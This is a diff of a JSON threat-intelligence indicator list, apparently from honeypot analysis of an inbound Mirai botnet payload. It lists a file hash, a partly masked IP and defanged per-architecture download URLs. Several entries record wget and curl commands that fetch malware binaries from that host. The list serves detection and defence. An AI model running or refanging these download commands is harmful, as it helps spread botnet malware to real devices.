@@ -1,21 +1,69 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "41.216.189.XXX"
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnx86_64xnxn;"
   },
   {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxn"
+    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv32xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnm68kxnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmipsxnxn;"
   },
   {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
     "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnaarch64xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv64xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnpowerpcxnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh2xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnor1kxnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh4xnxn;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmicroblazexnxn;"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -33,73 +81,13 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnm68kxnxn;"
+    "value": "hxxp://41.216.189.XXX/bins/xnxn"
   },
   {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmicroblazexnxn;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnmipsxnxn;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnor1kxnxn;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnpowerpcxnxn;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv32xnxn;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnriscv64xnxn;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh2xnxn;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnsh4xnxn;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnx86_64xnxn;"
-  },
-  {
-    "context": "Inbound payload hash (mirai)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "039a321462f98c9bb5e0ff6adf523fe8e28e87c36c3aa90b4192a6b1598386fc"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "wget hxxp://41.216.189.XXX/bins/xnxn"
+    "type": "ip",
+    "value": "41.216.189.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
@@ -178,5 +166,17 @@
     "source": "strings",
     "type": "command",
     "value": "wget hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnx86_64xnxn; curl -O hxxp://41.216.189.XXX/bins/xnxnxnxnxnxnxnxnx86_64xnx"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "wget hxxp://41.216.189.XXX/bins/xnxn"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "039a321462f98c9bb5e0ff6adf523fe8e28e87c36c3aa90b4192a6b1598386fc"
   }
 ]
